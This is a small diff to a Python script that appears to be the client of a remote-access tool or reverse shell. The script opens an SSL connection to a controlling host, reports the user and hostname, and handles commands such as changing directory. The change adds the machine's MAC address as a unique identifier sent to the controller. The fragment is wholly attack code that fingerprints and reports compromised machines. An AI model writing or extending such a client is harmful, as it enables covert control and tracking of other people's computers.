@@ -1,4 +1,5 @@
 #!/usr/bin/python
+from uuid import getnode as get_mac
 import json, os, base64, sys, socket, ssl, getpass, subprocess
 from os.path import expanduser
 home = expanduser("~")
@@ -12,7 +13,10 @@ sock = ssl.wrap_socket(s)
 sock.connect((host, port))
 # Send computer name
 username = getpass.getuser()
-sock.send(username + "@" + socket.gethostname())
+sock.send(json.dumps({
+	"name":username + "@" + socket.gethostname(),
+	"uid": str(get_mac())
+}))
 
 
 def change_dir(cmd_data):
